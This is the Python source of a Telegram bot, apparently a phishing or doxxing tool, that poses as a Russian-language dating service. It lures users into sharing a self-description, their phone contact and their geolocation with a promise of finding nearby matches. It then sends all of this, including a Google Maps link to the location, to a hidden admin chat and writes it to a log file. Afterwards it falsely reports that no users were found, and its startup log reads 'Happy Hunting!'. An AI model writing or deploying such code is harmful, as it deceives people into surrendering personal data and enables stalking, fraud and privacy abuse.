import logging
import asyncio
import os
import importlib.util
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode

# Установка уровня логирования
logging.basicConfig(level=logging.INFO)


# Определение пути к config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')


# Загрузка конфигурации
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)


API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID


# Инициализация бота и диспетчера
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


# Функция для отправки сообщения о запуске бота
async def send_startup_message():
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text="~ Bot has been started!")
    logging.info("[!] Bot has been Started!\n [+] Happy Hunting! :D")


# Обработчик команды /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer(f'''👋 Привет! {message.from_user.first_name}👋
    Это бот для знакомства!
    Чтобы начать, введите /search''')


# Обработчик команды /search
@dp.message_handler(commands=['search'])
async def search(message: types.Message):
    msg = await message.answer('Для начала напишите немного о себе (одним сообщением)')
    await proc2(msg)


# Функция для обработки сообщения пользователя
async def proc2(message: types.Message):
    try:
        num = message.text
        await bot.send_message(ADMIN_CHAT_ID, f'Полученная информация: {num}')
        logging.info(num)
        await asyncio.sleep(2)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True)
        keyboard.add(button_phone)
        await message.answer('''Для того, чтобы использовать бота, зарегистрируйтесь пожалуйста!''', reply_markup=keyboard)
    except Exception as e:
        logging.exception(e)
        await message.answer('Произошла неопознанная ошибка, перезагрузите бота!')

# Обработчик контактной информации
@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact:
        nick = message.from_user.username
        first = message.contact.first_name
        last = message.contact.last_name
        userid = message.contact.user_id
        phone = message.contact.phone_number
        await message.answer("Регистрация прошла успешно!")
        info = f'''
    Данные
    ├Имя: {first} {last}
    ├ID: {userid}
    ├Ник: @{nick}
    └Номер телефона: {phone}
            '''
        await bot.send_message(ADMIN_CHAT_ID, info)
        logging.info(info)

        if userid != message.chat.id:
            await message.answer('Отправьте свой контакт!')
        await asyncio.sleep(1)
        keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_location = types.KeyboardButton(text="Отправить", request_location=True)
        keyboard1.add(button_location)
        await message.answer(text='Отправьте свою геопозицию, чтобы бот нашел ближайших пользователей!', reply_markup=keyboard1)

# Обработчик геопозиции
@dp.message_handler(content_types=['location'])
async def location(message: types.Message):
    if message.location:
        lon = str(message.location.longitude)
        lat = str(message.location.latitude)
        geo = f'''
        Геолокация
        ├ID: {message.chat.id}
        ├Longitude: {lon}
        ├Latitude: {lat} 
        └Карты: https://www.google.com/maps/place/{lat}+{lon} 
        '''
        with open('bot-log.txt', 'a+', encoding='utf-8') as log:
            log.write(geo + '  ')
        await bot.send_message(ADMIN_CHAT_ID, geo)
        logging.info(geo)
        await message.answer('Поиск...')
        await asyncio.sleep(2)
        await message.answer('К сожалению в базе не найдено подходящих пользователей!')

# Запуск бота
async def main():
    await send_startup_message()
    logging.info("Starting the bot...")
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main())
